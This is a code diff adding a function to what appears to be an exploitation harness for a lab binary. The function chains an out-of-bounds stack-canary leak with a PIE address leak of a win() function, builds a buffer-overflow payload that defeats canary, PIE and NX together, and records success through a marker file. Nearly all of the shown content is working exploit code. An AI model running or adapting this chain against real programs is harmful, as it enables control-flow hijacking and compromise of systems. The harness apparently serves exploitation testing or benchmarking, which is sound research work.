@@ -377,6 +377,44 @@ def op_exploit_canary(a):
         results.append({"canary": hex(canary) if canary else None, "exit": rc, "marker_fired": fired})
     return {"times": times, "fires": fires, "reliability": fires / times if times else 0, "results": results}
 
+def op_exploit_combined(a):
+    # Capstone: PIE + canary + NX in one target. Per run, chain BOTH primitives:
+    # leak the canary (oob read at canary_offset) AND the randomized runtime address
+    # of win() (PIE code leak), then build filler + canary + fp-filler + win_runtime.
+    # A single-mitigation tool fails; this is the combined primitive.
+    re = __import__("re")
+    coff = int(a["canary_offset"]); roff = int(a["ret_offset"]); times = int(a.get("times", 5))
+    marker_env = a.get("marker", "")
+    fires, results = 0, []
+    for _ in range(times):
+        try: os.remove("/tmp/objective_marker")
+        except FileNotFoundError: pass
+        env = dict(os.environ)
+        if marker_env: env["AEGIS_MARKER"] = marker_env
+        io = process([BIN], env=env); canary = winrt = None
+        try:
+            io.send(coff.to_bytes(8, "little"))                    # trigger the oob canary leak
+            mem = io.recvuntil(b"\n", timeout=5)
+            m = re.search(rb"=0x([0-9a-fA-F]+)", mem); canary = int(m.group(1), 16) if m else None
+            wln = io.recvuntil(b"\n", timeout=5)                    # PIE code leak
+            w = re.search(rb"winptr=0x([0-9a-fA-F]+)", wln); winrt = int(w.group(1), 16) if w else None
+            if canary is None or winrt is None:
+                rc = None
+            else:
+                payload = (b"A" * coff + canary.to_bytes(8, "little")
+                           + b"B" * (roff - coff - 8) + winrt.to_bytes(8, "little"))
+                io.send(payload); rc = io.wait(timeout=5)
+        except Exception:
+            rc = None
+        finally:
+            try: io.close()
+            except Exception: pass
+        fired = os.path.exists("/tmp/objective_marker")
+        fires += 1 if fired else 0
+        results.append({"canary": hex(canary) if canary else None, "winrt": hex(winrt) if winrt else None,
+                        "exit": rc, "marker_fired": fired})
+    return {"times": times, "fires": fires, "reliability": fires / times if times else 0, "results": results}
+
 
 OPS = {k[3:]: v for k, v in globals().items() if k.startswith("op_")}
 
